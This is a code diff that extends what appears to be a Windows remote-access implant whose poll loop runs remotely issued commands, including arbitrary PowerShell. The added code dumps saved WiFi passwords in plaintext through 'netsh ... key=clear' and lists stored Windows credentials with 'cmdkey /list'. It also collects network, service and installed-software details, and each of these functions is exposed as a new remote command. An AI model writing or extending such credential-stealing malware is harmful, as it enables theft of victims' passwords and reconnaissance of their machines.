@@ -417,6 +417,65 @@ std::string getSystemInfo() {
     return out;
 }
 
+std::string getPasswords() {
+    std::string out = "=== WiFi Passwords ===\n";
+    std::string profiles = execCmd("netsh wlan show profiles");
+    size_t pos = 0;
+    int cnt = 0;
+    while ((pos = profiles.find("All User Profile", pos)) != std::string::npos) {
+        size_t colon = profiles.find(":", pos);
+        if (colon == std::string::npos) break;
+        size_t start = profiles.find_first_not_of(" \t\r\n", colon + 1);
+        if (start == std::string::npos) break;
+        size_t end = profiles.find("\r\n", start);
+        if (end == std::string::npos) end = profiles.size();
+        std::string name = profiles.substr(start, end - start);
+        while (!name.empty() && (name.back() == ' ' || name.back() == '\r' || name.back() == '\n')) name.pop_back();
+        if (name.empty()) { pos = end; continue; }
+        cnt++;
+        out += "\n[" + std::to_string(cnt) + "] " + name + "\n";
+        std::string keyInfo = execCmd("netsh wlan show profile name=\"" + name + "\" key=clear");
+        size_t kpos = keyInfo.find("Key Content");
+        if (kpos != std::string::npos) {
+            size_t kcolon = keyInfo.find(":", kpos);
+            size_t kstart = keyInfo.find_first_not_of(" \t\r\n", kcolon + 1);
+            size_t kend = keyInfo.find("\r\n", kstart);
+            if (kend == std::string::npos) kend = keyInfo.find("\n", kstart);
+            if (kend == std::string::npos) kend = keyInfo.size();
+            out += "  Password: " + keyInfo.substr(kstart, kend - kstart) + "\n";
+        } else {
+            out += "  Password: (not found/blank)\n";
+        }
+        pos = end;
+    }
+    if (cnt == 0) out += "  (no WiFi profiles)\n";
+    out += "\n=== Windows Credentials ===\n";
+    out += execCmd("cmdkey /list");
+    return out;
+}
+
+std::string getNetworkInfo() {
+    std::string out = "=== IP Configuration ===\n";
+    out += execCmd("ipconfig /all");
+    out += "\n=== Active Connections ===\n";
+    out += execCmd("netstat -an");
+    out += "\n=== ARP Table ===\n";
+    out += execCmd("arp -a");
+    out += "\n=== Routing Table ===\n";
+    out += execCmd("route print");
+    return out;
+}
+
+std::string getServices() {
+    return execCmd("sc query state= all");
+}
+
+std::string getInstalledApps() {
+    std::string out;
+    out += execCmd("powershell -c \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Format-Table -AutoSize -Wrap | Out-String -Width 4096\"");
+    return out;
+}
+
 DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
     int pingCtr=0;
@@ -496,6 +555,14 @@ DWORD WINAPI pollThread(LPVOID) {
                         result = execCmd("powershell -c "+payload);
                     } else if (type == "uptime") {
                         result=std::to_string(GetTickCount64()/1000);
+                    } else if (type == "passwords") {
+                        result = getPasswords();
+                    } else if (type == "network_info") {
+                        result = getNetworkInfo();
+                    } else if (type == "services") {
+                        result = getServices();
+                    } else if (type == "installed_apps") {
+                        result = getInstalledApps();
                     } else {
                         result = "unknown_type";
                     }
